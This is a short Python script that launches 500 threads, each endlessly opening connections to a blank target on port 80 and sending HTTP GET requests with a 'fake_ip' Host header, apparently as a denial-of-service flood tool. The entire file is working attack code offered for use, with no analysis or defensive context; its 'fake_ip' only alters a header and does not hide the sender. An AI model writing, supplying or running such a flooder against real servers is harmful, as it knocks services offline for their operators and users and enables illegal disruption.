import threading
import socket

target = ''
port = 80
fake_ip = '182.21.20.32'

already_connected = 0

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('utf-8'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('utf-8'), (target, port))
        s.close()
        global already_connected
        already_connected = already_connected+1
        if already_connected % 5000 == 0:
            print(already_connected)

for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()